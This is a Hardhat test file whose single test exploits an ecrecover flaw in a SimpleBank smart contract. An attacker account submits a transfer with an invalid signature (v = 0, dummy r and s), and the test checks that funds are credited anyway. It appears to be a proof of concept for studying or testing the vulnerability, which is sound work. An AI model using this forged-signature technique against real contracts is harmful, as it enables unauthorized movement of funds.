const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("SimpleBank Contract", function () {
  let owner, attacker, victim;
  let SimpleBank, simpleBank;

  beforeEach(async function () {
    [owner, attacker, victim] = await ethers.getSigners();

    SimpleBank = await ethers.getContractFactory("SimpleBank");
    simpleBank = await SimpleBank.deploy();
    await simpleBank.deployed();
  });

  it("Should trigger vulnerability with invalid ecrecover parameters", async function () {
    // Set up invalid signature parameters
    const invalidV = 0; // Invalid v value
    const r = "0x0123456789012345678901234567890123456789012345678901234567890123";
    const s = "0x0123456789012345678901234567890123456789012345678901234567890123";
    const hash = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("test"));

    // Attempt transfer using invalid signature parameters
    const attackTransfer = await simpleBank.connect(attacker).transfer(victim.address, 100, hash, invalidV, r, s);

    // Verify that balances are updated incorrectly
    const victimBalance = await simpleBank.getBalance(victim.address);
    expect(victimBalance).to.equal(100);
  });
});